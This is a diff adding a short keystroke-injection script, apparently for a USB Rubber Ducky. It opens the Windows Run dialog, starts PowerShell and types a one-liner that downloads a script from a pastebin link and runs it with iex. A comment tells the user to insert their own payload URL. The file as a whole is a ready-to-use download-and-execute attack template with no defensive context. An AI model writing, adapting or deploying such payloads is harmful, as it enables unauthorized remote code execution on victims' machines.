@@ -1,0 +1,12 @@
+REM Download script from pastebin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+REM Change the link at the end for your payload
+STRING (new-object System.Net.WebClient).DownloadString('https://pastebin.com/raw/your_script_link') | iex
+DELAY 1000
+ENTER
